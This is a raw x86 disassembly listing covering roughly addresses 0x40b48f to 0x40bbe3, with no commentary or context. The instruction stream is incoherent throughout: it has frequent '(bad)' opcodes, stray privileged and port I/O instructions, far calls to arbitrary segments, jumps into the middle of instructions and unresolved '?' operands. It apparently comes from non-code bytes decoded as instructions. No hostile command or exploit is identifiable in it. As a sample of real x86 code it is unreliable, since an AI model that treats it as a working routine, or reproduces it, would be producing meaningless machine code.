  40b48f:	stos   DWORD PTR es:[edi],eax
  40b490:	clc    
  40b491:	mov    ds:0xee370775,eax
  40b496:	out    0x65,eax
  40b498:	fst    DWORD PTR [ecx]
  40b49a:	xor    DWORD PTR [esi+0x21ad8aa],esi
  40b4a0:	add    DWORD PTR [ebp+0x1ea2ae78],0xc745a286
  40b4aa:	adc    al,0xc6
  40b4ac:	aaa    
  40b4ad:	test   al,0xe2
  40b4af:	cld    
  40b4b0:	rcr    DWORD PTR [edx-0x26],0xe1
  40b4b4:	dec    esp
  40b4b5:	das    
  40b4b6:	xchg   BYTE PTR [esi+0x1b],ah
  40b4b9:	mov    DWORD PTR [esi-0x3cee2090],esp
  40b4bf:	loop   0x40b4ca
  40b4c1:	syscall 
  40b4c3:	mov    DWORD PTR [esi+0x76],eax
  40b4c6:	add    al,BYTE PTR [ebx-0x40850410]
  40b4cc:	sbb    esp,DWORD PTR [eax+ebp*2]
  40b4cf:	fldenv [edx-0x24]
  40b4d2:	jnp    0x40b4f6
  40b4d4:	jne    0x40b512
  40b4d6:	xor    edi,DWORD PTR [eax+0x64772329]
  40b4dc:	xchg   ebx,eax
  40b4dd:	adc    BYTE PTR [ebp+0x5cf5eed9],0x20
  40b4e4:	retf   
  40b4e5:	les    edi,FWORD PTR [ebx]
  40b4e7:	ss jno 0x40b4aa
  40b4ea:	ins    BYTE PTR es:[edi],dx
  40b4eb:	(bad)
  40b4ee:	gs mov bh,0x52
  40b4f1:	or     DWORD PTR [edx-0x1f],ebx
  40b4f4:	jne    0x40b49d
  40b4f6:	les    edx,FWORD PTR [ebp-0x5f]
  40b4f9:	or     BYTE PTR [eax+0x56c0c87e],bl
  40b4ff:	jle    0x40b4d1
  40b501:	sub    eax,0xd336329a
  40b506:	or     edi,edi
  40b508:	out    0x5a,eax
  40b50a:	adc    esp,DWORD PTR [esi-0x40eba640]
  40b510:	xchg   esp,eax
  40b511:	mov    es,WORD PTR gs:[ebx]
  40b514:	jnp    0x40b548
  40b516:	pop    edi
  40b517:	mov    BYTE PTR [eax],ah
  40b519:	iret   
  40b51a:	jl     0x40b52e
  40b51c:	int3   
  40b51d:	jns    0x40b544
  40b51f:	inc    ecx
  40b520:	ja     0x40b4a5
  40b522:	daa    
  40b523:	inc    esp
  40b524:	sub    ah,BYTE PTR [ecx]
  40b526:	xchg   edi,eax
  40b527:	imul   eax,DWORD PTR [esi-0x2b10b71f],0xffffffa4
  40b52e:	add    al,dl
  40b530:	jne    0x40b558
  40b532:	inc    esi
  40b533:	jne    0x40b599
  40b535:	mov    eax,ds:0x38902d1
  40b53a:	ja     0x40b523
  40b53c:	mov    cl,0xa3
  40b53e:	repz dec ebx
  40b540:	hlt    
  40b541:	ins    BYTE PTR es:[edi],dx
  40b542:	xor    ecx,DWORD PTR [ebp+eiz*1+0x591810a3]
  40b549:	mov    ch,0xac
  40b54b:	outs   dx,BYTE PTR ds:[esi]
  40b54c:	mov    bl,0xc1
  40b54e:	and    eax,0x1986e245
  40b553:	or     dl,BYTE PTR [ebx-0x26048c3]
  40b559:	test   al,0x1e
  40b55b:	lock xchg BYTE PTR [ebx-0x324413aa],dh
  40b562:	sbb    ecx,DWORD PTR [edx+0x38]
  40b565:	out    0x46,eax
  40b567:	fadd   DWORD PTR [edi+0x64cdde04]
  40b56d:	je     0x40b505
  40b56f:	xchg   ebp,eax
  40b570:	test   eax,0xe848faef
  40b575:	call   0x6570:0x39ad5b88
  40b57c:	xchg   ebx,eax
  40b57d:	jbe    0x40b535
  40b57f:	fwait
  40b580:	js     0x40b5c7
  40b582:	ror    BYTE PTR [ebp-0x1c],cl
  40b585:	or     DWORD PTR [edx-0x55],ecx
  40b588:	and    esp,DWORD PTR [esi-0x5411579e]
  40b58e:	sub    DWORD PTR [esi],0xffffff8c
  40b591:	mov    ebx,0xc44af131
  40b596:	jno    0x40b5de
  40b598:	pop    edi
  40b599:	add    bl,BYTE PTR [edx-0xf]
  40b59c:	enter  0x27b0,0xc8
  40b5a0:	xor    dh,BYTE PTR [ebp+0x39]
  40b5a3:	and    BYTE PTR [ebp-0x5a],bl
  40b5a6:	xor    al,BYTE PTR [ebx]
  40b5a8:	sahf   
  40b5a9:	add    BYTE PTR [ecx],ch
  40b5ab:	jo     0x40b5e1
  40b5ad:	ret    
  40b5ae:	mov    ebx,0x820f1876
  40b5b3:	pop    esi
  40b5b4:	push   ebx
  40b5b5:	in     al,dx
  40b5b6:	mov    cl,0x7c
  40b5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b9:	in     al,0x99
  40b5bb:	and    al,0xe4
  40b5bd:	fcmovu st,st(7)
  40b5bf:	lods   eax,DWORD PTR ds:[esi]
  40b5c0:	jo     0x40b545
  40b5c2:	out    dx,eax
  40b5c3:	aaa    
  40b5c4:	cld    
  40b5c5:	xor    BYTE PTR [edi],ah
  40b5c7:	ror    BYTE PTR [ebp+0x756bae1],0x52
  40b5ce:	sbb    ch,BYTE PTR [eax]
  40b5d0:	(bad)  
  40b5d1:	pop    ds
  40b5d2:	push   0xb3995926
  40b5d7:	push   esp
  40b5d8:	sbb    al,0x17
  40b5da:	into   
  40b5db:	bound  edx,QWORD PTR [eax-0x55]
  40b5de:	xor    al,BYTE PTR [esi+0x3a310e56]
  40b5e4:	ds ret 
  40b5e6:	add    bl,BYTE PTR [ebx+0x27ef88ae]
  40b5ec:	(bad)  
  40b5ed:	jmp    0x40b5a0
  40b5ef:	sbb    eax,ecx
  40b5f1:	stc    
  40b5f2:	ins    BYTE PTR es:[edi],dx
  40b5f3:	sub    cl,al
  40b5f5:	cld    
  40b5f6:	rcl    DWORD PTR [ebp+0x4],0x30
  40b5fa:	neg    ecx
  40b5fc:	adc    eax,0x9bc27171
  40b601:	arpl   WORD PTR gs:[ebp-0x1dddbd20],ax
  40b608:	sub    cl,BYTE PTR [ebx]
  40b60a:	sbb    DWORD PTR [edx+edx*2+0x5d658a0],0x4
  40b612:	push   esp
  40b613:	paddusw mm1,QWORD PTR [ecx-0x5]
  40b617:	loope  0x40b5ae
  40b619:	sub    ah,BYTE PTR [ebp+0x14]
  40b61c:	cvtpi2ps xmm4,mm2
  40b61f:	into   
  40b620:	sbb    BYTE PTR [esi+0x4e03deeb],ch
  40b626:	mov    ch,0x3a
  40b628:	push   ebx
  40b629:	push   ss
  40b62a:	adc    edx,ecx
  40b62c:	cmp    DWORD PTR [edi+0x6705248e],edi
  40b632:	mov    esp,0x84623bf1
  40b637:	pop    ds
  40b638:	mov    dh,0xbd
  40b63a:	push   ss
  40b63b:	add    esi,esp
  40b63d:	cmp    BYTE PTR [eax-0x38],ah
  40b640:	xor    BYTE PTR ds:0x9aec1b4e,al
  40b646:	or     eax,0x80d6bfd
  40b64b:	mov    ds:0x8c2965cf,al
  40b650:	mov    dl,0xf8
  40b652:	(bad)  
  40b653:	inc    esi
  40b654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b655:	loope  0x40b600
  40b657:	shl    BYTE PTR [ebx+0x1d958542],1
  40b65d:	call   DWORD PTR [edx-0x26]
  40b660:	push   DWORD PTR [edx]
  40b662:	adc    ebx,0x57ab27b4
  40b668:	(bad)  
  40b669:	push   esp
  40b66a:	dec    edi
  40b66b:	outs   dx,BYTE PTR ds:[esi]
  40b66c:	call   0xe204:0xded25046
  40b673:	jne    0x40b66b
  40b675:	out    0xda,al
  40b677:	inc    esp
  40b678:	loope  0x40b674
  40b67a:	mov    ebx,0x7a3e7b87
  40b67f:	sub    ch,dl
  40b681:	mov    ah,0xf1
  40b683:	mov    ch,0x48
  40b685:	iret   
  40b686:	sbb    eax,0x5544562c
  40b68b:	dec    edi
  40b68c:	xor    BYTE PTR [esi],cl
  40b68e:	pop    ebp
  40b68f:	sub    ebx,0x17
  40b692:	(bad)  
  40b694:	hlt    
  40b695:	iret   
  40b696:	rep ins DWORD PTR es:[edi],dx
  40b698:	jne    0x40b6f7
  40b69a:	jne    0x40b6fc
  40b69c:	lods   al,BYTE PTR ds:[esi]
  40b69d:	adc    ecx,DWORD PTR [esi+0x56204fab]
  40b6a3:	jns    0x40b658
  40b6a5:	sti    
  40b6a6:	mov    bh,0xe2
  40b6a8:	repz dec eax
  40b6aa:	std    
  40b6ab:	leave  
  40b6ac:	xchg   ebp,ebp
  40b6ae:	jg     0x40b6f9
  40b6b0:	or     BYTE PTR [eax-0x42],cl
  40b6b3:	clc    
  40b6b4:	mov    ebp,edi
  40b6b6:	lahf   
  40b6b7:	add    al,0x4
  40b6ba:	cmp    eax,0x40697716
  40b6bf:	mov    esi,0xa0ea266f
  40b6c4:	sub    eax,0x4df0f642
  40b6c9:	cmp    DWORD PTR [edi+0x11],ecx
  40b6cc:	inc    ebx
  40b6cd:	cli    
  40b6ce:	push   ebx
  40b6cf:	(bad)  
  40b6d0:	mov    eax,0x5ec24c88
  40b6d5:	mov    esi,0xdf6fbbdc
  40b6da:	sbb    eax,DWORD PTR [esi+eax*2+0x25]
  40b6de:	leave  
  40b6df:	sbb    edi,esp
  40b6e1:	test   al,0xfe
  40b6e3:	xchg   esp,eax
  40b6e4:	cs cdq 
  40b6e6:	push   ebp
  40b6e7:	mov    ch,0xf
  40b6e9:	clc    
  40b6ea:	push   ebx
  40b6eb:	fld    QWORD PTR [edx+0x19]
  40b6ee:	jno    0x40b679
  40b6f0:	dec    esp
  40b6f1:	std    
  40b6f2:	adc    esp,DWORD PTR [ebp-0x37]
  40b6f5:	push   ebx
  40b6f6:	fild   WORD PTR [ebp+0x3]
  40b6f9:	xor    DWORD PTR [ecx-0x355a4385],esp
  40b6ff:	int3   
  40b700:	mov    dl,0x16
  40b702:	fbstp  TBYTE PTR [ebp-0x1d47a3ad]
  40b708:	das    
  40b709:	xchg   esi,eax
  40b70a:	sbb    DWORD PTR [ebp+esi*1-0x2f],ecx
  40b70e:	jae    0x40b709
  40b710:	aam    0xdc
  40b712:	sahf   
  40b713:	mov    al,es:0x1ac00b4e
  40b719:	push   ecx
  40b71a:	loope  0x40b749
  40b71c:	xchg   edi,eax
  40b71d:	inc    ebp
  40b71e:	adc    bh,bl
  40b720:	jne    0x40b79d
  40b722:	add    ah,ah
  40b724:	jbe    0x40b77d
  40b726:	inc    esp
  40b727:	mov    fs,WORD PTR [esi]
  40b729:	push   0xffffff91
  40b72b:	xchg   ebp,eax
  40b72c:	adc    al,0xe2
  40b72e:	mov    esp,0xb7283c14
  40b733:	dec    edx
  40b734:	add    sp,dx
  40b737:	xchg   BYTE PTR [edx],dh
  40b739:	xchg   esi,eax
  40b73a:	inc    esp
  40b73b:	cmp    ecx,ebp
  40b73d:	in     al,dx
  40b73e:	lahf   
  40b73f:	xor    DWORD PTR [edi-0x15],ebx
  40b742:	mov    WORD PTR [esi+0x8],?
  40b745:	fild   DWORD PTR [ebx-0x15568fe7]
  40b74b:	sti    
  40b74c:	dec    esi
  40b74d:	inc    edi
  40b74e:	int3   
  40b74f:	sbb    dh,BYTE PTR [esi]
  40b751:	cmp    eax,0x84e2046c
  40b756:	pop    esp
  40b757:	jecxz  0x40b6f1
  40b759:	cmp    eax,0xc8fb9239
  40b75e:	and    eax,0xb8622754
  40b763:	inc    edx
  40b764:	cld    
  40b765:	xchg   edi,eax
  40b766:	gs ins DWORD PTR es:[edi],dx
  40b768:	jl     0x40b796
  40b76a:	imul   edi,DWORD PTR [eax-0x5b],0xa5774860
  40b771:	test   DWORD PTR [esi+0x4f],0xc5b47299
  40b778:	jmp    0x40b7cc
  40b77a:	dec    ebx
  40b77b:	jg     0x40b700
  40b77d:	in     al,0x8b
  40b77f:	bound  edi,QWORD PTR [esi]
  40b781:	aad    0x4e
  40b783:	test   DWORD PTR [edx-0x2b3b2cf4],0x70aab31d
  40b78d:	cdq    
  40b78e:	jb     0x40b7e8
  40b790:	pop    esp
  40b791:	fsubr  QWORD PTR [ebx]
  40b793:	addr16 mov eax,ds:0x32ea
  40b797:	push   esp
  40b798:	xchg   ecx,eax
  40b799:	repnz iret 
  40b79b:	add    bh,bl
  40b79d:	dec    edx
  40b79e:	stos   DWORD PTR es:[edi],eax
  40b79f:	sub    BYTE PTR [ebp-0x3e],bl
  40b7a2:	adc    ebx,DWORD PTR [edx]
  40b7a4:	out    dx,eax
  40b7a5:	and    al,0xa5
  40b7a7:	mov    ecx,0xc8aeba99
  40b7ac:	push   cs
  40b7ad:	stc    
  40b7ae:	sar    dh,0x8d
  40b7b1:	fwait
  40b7b2:	aaa    
  40b7b3:	adc    BYTE PTR ds:0x2d026c21,dh
  40b7b9:	mov    ?,esp
  40b7bb:	adc    eax,0x2b786800
  40b7c0:	fsub   QWORD PTR [eax+0x4d]
  40b7c3:	adc    DWORD PTR [ecx],ebx
  40b7c5:	mov    al,ds:0xc5c64004
  40b7ca:	push   ecx
  40b7cb:	sbb    eax,DWORD PTR [esp+eax*8]
  40b7ce:	inc    edx
  40b7cf:	scas   eax,DWORD PTR es:[edi]
  40b7d0:	dec    esp
  40b7d1:	leave  
  40b7d2:	das    
  40b7d3:	out    dx,eax
  40b7d4:	shr    DWORD PTR [ebp+0x65598ebb],cl
  40b7da:	and    BYTE PTR [esi-0x4a],ch
  40b7dd:	sbb    DWORD PTR [eax+0x53],ebp
  40b7e0:	(bad)  
  40b7e1:	cdq    
  40b7e2:	ss pop ss
  40b7e4:	rol    BYTE PTR [ecx],cl
  40b7e6:	dec    edi
  40b7e7:	jbe    0x40b7a3
  40b7e9:	or     al,0xfd
  40b7eb:	loope  0x40b860
  40b7ed:	inc    ecx
  40b7ee:	jmp    0xa50b:0xc41083bb
  40b7f5:	xchg   ecx,eax
  40b7f6:	push   ss
  40b7f7:	shl    ecx,0xe0
  40b7fa:	adc    ebp,edx
  40b7fc:	cmp    al,BYTE PTR [esi+ebp*8+0x72e750ba]
  40b803:	lods   eax,DWORD PTR ds:[esi]
  40b804:	mov    BYTE PTR [edx-0x59074908],ah
  40b80a:	mov    edi,0x8fb740be
  40b80f:	mov    al,ds:0x9f3c4414
  40b814:	dec    cl
  40b816:	ja     0x40b7c3
  40b818:	test   eax,0x4158a34c
  40b81d:	adc    eax,0xb5ee86b0
  40b822:	xlat   BYTE PTR ds:[ebx]
  40b823:	sub    eax,DWORD PTR ds:0xb0b72878
  40b829:	enter  0xaa27,0x82
  40b82d:	scas   eax,DWORD PTR es:[edi]
  40b82e:	lahf   
  40b82f:	mov    esi,0xeae61570
  40b834:	mov    ecx,0x59412298
  40b839:	sub    BYTE PTR [esi-0x3dcd22ad],al
  40b83f:	ret    
  40b840:	dec    edi
  40b841:	daa    
  40b842:	mov    gs,WORD PTR [ebp-0x97c9790]
  40b848:	shr    DWORD PTR [esi],cl
  40b84a:	lock add BYTE PTR [edi+0x49f20cd7],dh
  40b851:	push   ss
  40b852:	pusha  
  40b853:	cmp    esp,ecx
  40b855:	jae    0x40b8bc
  40b857:	adc    eax,0x3c6019a8
  40b85c:	mov    dh,0xdf
  40b85e:	call   0x62a1cf92
  40b863:	lahf   
  40b864:	jecxz  0x40b8ca
  40b866:	adc    esp,0x69
  40b869:	les    ecx,FWORD PTR [eax]
  40b86b:	and    BYTE PTR [edi+0x768fd89c],ch
  40b871:	add    ch,BYTE PTR [edx-0x5e]
  40b874:	push   ebx
  40b875:	xchg   edi,eax
  40b876:	outs   dx,DWORD PTR ds:[esi]
  40b877:	pop    ecx
  40b878:	jne    0x40b8e6
  40b87a:	xor    eax,esp
  40b87c:	adc    eax,0xda2ea4a
  40b881:	dec    eax
  40b882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b883:	xchg   BYTE PTR [edi+0x6a],cl
  40b886:	mov    eax,0x82e08902
  40b88b:	mov    al,0x8b
  40b88d:	sbb    al,0x1d
  40b88f:	popf   
  40b890:	sahf   
  40b891:	inc    eax
  40b892:	daa    
  40b893:	ret    
  40b894:	fidiv  DWORD PTR [edi]
  40b896:	scas   eax,DWORD PTR es:[edi]
  40b897:	jg     0x40b8e2
  40b899:	mov    bl,0xa9
  40b89b:	sub    eax,0x4ccf3313
  40b8a0:	fwait
  40b8a1:	mov    ch,0xb0
  40b8a3:	cmp    al,0xcc
  40b8a5:	jecxz  0x40b861
  40b8a7:	sub    bl,BYTE PTR [esi+ebp*2+0x2]
  40b8ab:	mov    dh,0x33
  40b8ad:	jle    0x40b841
  40b8af:	or     cl,BYTE PTR [edx-0x2c]
  40b8b2:	mov    edi,0x6c175d
  40b8b7:	in     al,0xb7
  40b8b9:	xchg   ebp,eax
  40b8ba:	pop    edx
  40b8bb:	nop
  40b8bc:	shl    BYTE PTR [eax],0x58
  40b8bf:	dec    eax
  40b8c0:	aaa    
  40b8c1:	pop    ebp
  40b8c2:	mov    ss,WORD PTR [esi]
  40b8c4:	lea    ecx,ss:0x9fb09940
  40b8cb:	icebp  
  40b8cc:	sub    esp,esp
  40b8ce:	mov    ch,0x21
  40b8d0:	adc    dh,dh
  40b8d2:	sbb    al,BYTE PTR [eax+0x780d4e1a]
  40b8d8:	mov    bh,0x51
  40b8da:	loopne 0x40b8a8
  40b8dc:	outs   dx,BYTE PTR ds:[esi]
  40b8dd:	mov    cl,0xf6
  40b8df:	mov    ds:0x569f3163,al
  40b8e4:	in     al,0x32
  40b8e6:	retf   0x5401
  40b8e9:	push   ecx
  40b8ea:	xor    ecx,edi
  40b8ec:	cmp    BYTE PTR [eax+0x2c],0x7c
  40b8f0:	sbb    edi,ebp
  40b8f2:	jne    0x40b892
  40b8f4:	sub    DWORD PTR [edi-0x43],esi
  40b8f7:	push   0xffffffe1
  40b8f9:	outs   dx,BYTE PTR ds:[esi]
  40b8fa:	outs   dx,BYTE PTR ds:[esi]
  40b8fb:	fldlg2 
  40b8fd:	call   0xd069:0x3a44f63d
  40b904:	add    eax,DWORD PTR [ecx+0x27]
  40b907:	xchg   ecx,eax
  40b908:	xchg   ebp,eax
  40b909:	out    0xc4,eax
  40b90b:	loopne 0x40b953
  40b90d:	shr    DWORD PTR [ebx+0x1c],0xb9
  40b911:	pop    edx
  40b912:	shr    bl,1
  40b914:	jg     0x40b8a7
  40b916:	cmp    edi,DWORD PTR [edi]
  40b918:	aas    
  40b919:	out    dx,al
  40b91a:	loop   0x40b997
  40b91c:	arpl   WORD PTR [esi-0x30],si
  40b91f:	pop    esp
  40b920:	ds (bad) 
  40b922:	out    0x31,al
  40b924:	xchg   ebx,eax
  40b925:	stos   BYTE PTR es:[edi],al
  40b926:	cmp    esp,DWORD PTR [ecx+edi*2+0x5]
  40b92a:	ret    0x33ff
  40b92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b92e:	sbb    al,0x7e
  40b930:	jno    0x40b973
  40b932:	and    esi,DWORD PTR [ecx+0x45]
  40b935:	mov    ebp,0x86bd2b8a
  40b93a:	lods   al,BYTE PTR ds:[esi]
  40b93b:	jo     0x40b913
  40b93d:	sbb    al,0x9b
  40b93f:	mov    cl,0xa9
  40b941:	pop    edi
  40b942:	push   edx
  40b943:	cmp    DWORD PTR [eax+0x7ed98e91],ebx
  40b949:	test   eax,0x16736a33
  40b94e:	mov    esi,0x19807176
  40b953:	dec    ebx
  40b954:	or     al,0x90
  40b956:	inc    ebp
  40b957:	iret   
  40b958:	(bad)  
  40b959:	dec    ecx
  40b95a:	retf   
  40b95b:	push   edi
  40b95c:	lds    edx,FWORD PTR [esi-0x17455ecf]
  40b962:	xor    al,0x84
  40b964:	xchg   ebp,eax
  40b965:	sbb    cl,BYTE PTR [edx+0x67]
  40b968:	das    
  40b969:	push   ds
  40b96a:	dec    esp
  40b96b:	shr    DWORD PTR [eax],cl
  40b96d:	add    DWORD PTR [edx+0x68],ebx
  40b970:	and    cl,BYTE PTR es:[esi]
  40b973:	jbe    0x40b973
  40b975:	rcr    esi,cl
  40b977:	cli    
  40b978:	push   ebp
  40b979:	jg     0x40b913
  40b97b:	retf   
  40b97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b97d:	ror    BYTE PTR [esi-0x7180dfba],cl
  40b983:	(bad)  
  40b985:	cmp    al,ch
  40b987:	pusha  
  40b988:	shr    DWORD PTR [esi-0x6f2c08c3],1
  40b98e:	out    0xb5,eax
  40b990:	fsubr  DWORD PTR [ebp+edi*2-0x28]
  40b994:	and    DWORD PTR [edx],eax
  40b996:	bound  ebp,QWORD PTR [edx]
  40b998:	jp     0x40b9b8
  40b99a:	dec    ecx
  40b99b:	mov    DWORD PTR [esi-0x21018756],ecx
  40b9a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9a2:	jnp    0x40b985
  40b9a4:	mov    dl,BYTE PTR [edi*8+0x79d4f64d]
  40b9ab:	jl     0x40b943
  40b9ad:	jb     0x40ba11
  40b9af:	fisubr WORD PTR [edi+0xb]
  40b9b2:	je     0x40b9c7
  40b9b4:	repz leave 
  40b9b6:	in     al,dx
  40b9b7:	out    0x90,al
  40b9b9:	sti    
  40b9ba:	mov    cx,0x6a85
  40b9be:	in     eax,0x65
  40b9c0:	clc    
  40b9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c2:	shl    BYTE PTR [eax+0x8658b9b],0xd1
  40b9c9:	sbb    esp,eax
  40b9cb:	loopne 0x40b9f3
  40b9cd:	aas    
  40b9ce:	repz scas eax,DWORD PTR es:[edi]
  40b9d0:	cmp    al,0x41
  40b9d2:	and    al,0xfe
  40b9d4:	jb     0x40ba1e
  40b9d6:	mov    dl,0xbb
  40b9d8:	ret    
  40b9d9:	ins    BYTE PTR es:[edi],dx
  40b9da:	test   eax,0xb000d267
  40b9df:	rcr    BYTE PTR [edi-0x39d889c0],1
  40b9e5:	mov    bl,0xf9
  40b9e7:	jns    0x40ba64
  40b9e9:	push   edx
  40b9ea:	in     eax,0x7
  40b9ec:	add    BYTE PTR [ecx-0x37],ch
  40b9ef:	std    
  40b9f0:	or     DWORD PTR ds:0xe7e832b2,esi
  40b9f6:	std    
  40b9f7:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9f9:	imul   ebp,DWORD PTR [edx+esi*2],0xb10739db
  40ba00:	mov    al,ds:0xf1843122
  40ba05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba06:	in     al,0x8
  40ba08:	dec    edx
  40ba09:	test   eax,0x1fcb761a
  40ba0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba0f:	std    
  40ba10:	out    0x7,al
  40ba12:	sbb    cl,ah
  40ba14:	or     al,0x10
  40ba16:	movdqa xmm3,xmm0
  40ba1a:	gs push cs
  40ba1c:	sbb    ah,ah
  40ba1e:	(bad)  [ecx-0x36499969]
  40ba24:	sbb    al,0x12
  40ba26:	leave  
  40ba27:	hlt    
  40ba28:	stos   BYTE PTR es:[edi],al
  40ba29:	adc    eax,0xb35d5d77
  40ba2e:	cmp    DWORD PTR ds:0xe3503fce,ebp
  40ba34:	xchg   edi,eax
  40ba35:	rcl    BYTE PTR [ebx],cl
  40ba37:	pop    ebx
  40ba38:	mov    cl,0xd0
  40ba3a:	and    edi,DWORD PTR [eax+0x3172dbc6]
  40ba40:	loopne 0x40ba36
  40ba42:	mov    cl,ah
  40ba44:	cs popa 
  40ba46:	xor    al,0x7a
  40ba48:	pusha  
  40ba49:	dec    edx
  40ba4a:	aas    
  40ba4b:	mov    ds:0x179f0dcc,eax
  40ba50:	or     bh,BYTE PTR [edx]
  40ba52:	pushf  
  40ba53:	dec    edx
  40ba54:	pop    edi
  40ba55:	jns    0x40ba63
  40ba57:	das    
  40ba58:	inc    ebp
  40ba59:	mov    ebx,0xae8597e0
  40ba5e:	into   
  40ba5f:	sub    al,0x8f
  40ba61:	ret    
  40ba62:	adc    al,dl
  40ba64:	mov    eax,ds:0xf2144639
  40ba69:	mov    ds:0xaaa1e5ed,al
  40ba6e:	push   ss
  40ba6f:	push   ss
  40ba70:	mov    eax,ds:0x74951df9
  40ba75:	fwait
  40ba76:	into   
  40ba77:	mov    BYTE PTR [eax],bh
  40ba79:	ret    
  40ba7a:	rcl    DWORD PTR [ecx-0x2b],0xf9
  40ba7e:	mov    bl,0x6b
  40ba80:	add    esi,0x19
  40ba83:	jne    0x40ba8d
  40ba85:	xchg   ebx,eax
  40ba86:	inc    edx
  40ba87:	out    dx,al
  40ba88:	ficomp WORD PTR ds:0x2f01b016
  40ba8e:	adc    DWORD PTR [eax],0x57203a96
  40ba94:	inc    ebp
  40ba95:	shl    DWORD PTR [eax],cl
  40ba97:	ins    DWORD PTR es:[edi],dx
  40ba98:	nop
  40ba99:	cld    
  40ba9a:	pop    edx
  40ba9b:	dec    ebx
  40ba9c:	fild   QWORD PTR [eax]
  40ba9e:	out    0x6e,eax
  40baa0:	mov    ah,0x99
  40baa2:	xchg   ebx,eax
  40baa3:	mov    ah,0x14
  40baa5:	loopne 0x40bb00
  40baa7:	sbb    BYTE PTR [eax],al
  40baa9:	pop    esp
  40baaa:	push   esp
  40baab:	pop    ecx
  40baac:	inc    eax
  40baad:	mov    ebx,DWORD PTR gs:[ebp+0x2d]
  40bab1:	outs   dx,BYTE PTR ds:[esi]
  40bab2:	mov    bh,0xaf
  40bab4:	sahf   
  40bab5:	mov    esp,0xc19df4b7
  40baba:	xor    al,0x1a
  40babc:	bound  esp,QWORD PTR [ecx+edi*1+0x1db7d78e]
  40bac3:	push   ecx
  40bac4:	loope  0x40ba63
  40bac6:	sysexit 
  40bac8:	out    0xd9,eax
  40baca:	push   ds
  40bacb:	adc    eax,0x6ee03755
  40bad0:	int3   
  40bad1:	mov    ah,0xb6
  40bad3:	sar    edx,0xd0
  40bad6:	call   0x997c:0x439e14e8
  40badd:	pop    ebx
  40bade:	cld    
  40badf:	push   es
  40bae0:	sub    BYTE PTR [edi-0x68],dl
  40bae3:	sub    cx,WORD PTR es:[ebp+0x169a1a97]
  40baeb:	jmp    0x40bac7
  40baed:	pop    edi
  40baee:	push   cs
  40baef:	in     al,0xbd
  40baf1:	push   ebp
  40baf2:	xchg   ecx,eax
  40baf3:	inc    ebp
  40baf4:	mov    ds:0x3151b7ae,al
  40baf9:	pop    ecx
  40bafa:	mov    BYTE PTR [edx-0x4b4e41f1],ch
  40bb00:	mov    dh,0xed
  40bb02:	dec    ecx
  40bb03:	les    ecx,FWORD PTR ds:0x73cfeef0
  40bb09:	push   0x2
  40bb0b:	cmp    DWORD PTR [eax+eiz*2-0x5ecfab57],edx
  40bb12:	xchg   ebp,eax
  40bb13:	or     al,0x9e
  40bb15:	mov    ch,0x39
  40bb17:	push   0xe993de7e
  40bb1c:	add    al,0x7d
  40bb1e:	bound  ecx,QWORD PTR ds:0xe4cd53c8
  40bb24:	pop    DWORD PTR [esi-0x5867da5f]
  40bb2a:	xchg   esi,eax
  40bb2b:	in     eax,0x91
  40bb2d:	addr16 jae 0x40bb22
  40bb30:	jmp    FWORD PTR [ecx+0x1e77f737]
  40bb36:	pop    ss
  40bb37:	jno    0x40bad7
  40bb39:	adc    ecx,DWORD PTR [ecx+0x73]
  40bb3c:	and    DWORD PTR [ebx+0x14],edi
  40bb3f:	inc    esp
  40bb40:	(bad)  
  40bb41:	xor    ebx,ecx
  40bb43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb44:	cmp    dh,ch
  40bb46:	std    
  40bb47:	imul   esp,eax,0x65da0339
  40bb4d:	mov    edx,0x602ccae
  40bb52:	add    dl,bh
  40bb54:	mov    bl,0x8e
  40bb56:	in     al,0xac
  40bb58:	test   al,0x7c
  40bb5a:	dec    edx
  40bb5b:	push   cs
  40bb5c:	adc    edx,esp
  40bb5e:	dec    ecx
  40bb5f:	and    eax,0xac87b93b
  40bb64:	ins    DWORD PTR es:[edi],dx
  40bb65:	cmp    eax,eax
  40bb67:	imul   ebp,esi,0xffffffe3
  40bb6a:	shr    DWORD PTR [ebx],0x83
  40bb6d:	push   0x32516c58
  40bb72:	lods   al,BYTE PTR ds:[esi]
  40bb73:	loop   0x40bb7d
  40bb75:	adc    BYTE PTR [esi],ch
  40bb77:	fadd   QWORD PTR [edi]
  40bb79:	out    dx,al
  40bb7a:	rcr    DWORD PTR [esi+0x56],cl
  40bb7d:	pop    ss
  40bb7e:	inc    ebx
  40bb7f:	jg     0x40bbd9
  40bb81:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40bb83:	xlat   BYTE PTR ds:[ebx]
  40bb84:	pop    edx
  40bb85:	adc    BYTE PTR [esi+0x11627e29],dl
  40bb8b:	stc    
  40bb8c:	xor    edx,ebx
  40bb8e:	jl     0x40bb69
  40bb90:	add    DWORD PTR [ecx+0x1cfcd462],edx
  40bb96:	inc    esi
  40bb97:	mov    bh,BYTE PTR [edi+eiz*1+0x628b62ef]
  40bb9e:	inc    edi
  40bb9f:	aas    
  40bba0:	sub    esi,DWORD PTR [ebx-0x23c3474c]
  40bba6:	adc    BYTE PTR [edi-0x1e5c1392],ch
  40bbac:	inc    esp
  40bbad:	mov    dh,0xfc
  40bbaf:	mov    WORD PTR ss:[bp+0x3e],cs
  40bbb4:	or     al,0xb7
  40bbb6:	fdiv   DWORD PTR [edx+0x7f4d657f]
  40bbbc:	sbb    DWORD PTR [edx],0x8e053cc0
  40bbc2:	mov    cl,0xcc
  40bbc4:	int3   
  40bbc5:	push   ecx
  40bbc6:	leave  
  40bbc7:	jno    0x40bb66
  40bbc9:	enter  0xfe75,0x28
  40bbcd:	sub    bh,BYTE PTR [ebx+ebp*8-0x7973dc95]
  40bbd4:	shl    DWORD PTR [edi+0x62a3ee77],1
  40bbda:	jge    0x40bb8c
  40bbdc:	adc    al,0x98
  40bbde:	enter  0x62d5,0xd7
  40bbe2:	scas   eax,DWORD PTR es:[edi]
  40bbe3:	mov    ah,0x53
